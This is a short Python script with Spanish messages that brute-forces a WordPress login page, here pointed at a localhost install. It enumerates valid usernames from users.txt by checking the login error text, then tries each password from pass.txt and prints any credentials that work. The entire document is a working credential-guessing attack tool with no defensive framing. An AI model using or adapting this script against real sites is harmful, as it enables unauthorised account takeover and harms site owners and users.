import requests

def obtenercredenciales(user):

	url = 'http://localhost/wordpress/wp-login.php'
	headers = {'Cookie': 'wordpress_test_cookie=WP+Cookie+check','testcookie':'1'}
	payload = {'log':'{}'.format(user),'pwd':'esevka','wp-submit':'Acceder'}

	r=requests.post(url,headers=headers,data=payload)
  
	if "Nombre de usuario desconocido." not in r.text:
		print('[+]Usuario valido ---> {}'.format(user))

		with open("pass.txt","r") as line_pass:
			for passwd in line_pass:

				url = 'http://localhost/wordpress/wp-login.php'
				headers = {'Cookie': 'wordpress_test_cookie=WP+Cookie+check','testcookie':'1'}
				payload = {'log':'{}'.format(user),'pwd':'{}'.format(passwd.strip()),'wp-submit':'Acceder'}

				r = requests.post(url,headers=headers,data=payload)

				if "no es correcta." not in r.text:
					print('[+]Pass valida ---> {}'.format(passwd))

def main():
	with open("users.txt","r") as line_user:
		for user in line_user:
			obtenercredenciales(user.strip())

if __name__=="__main__":
	main()
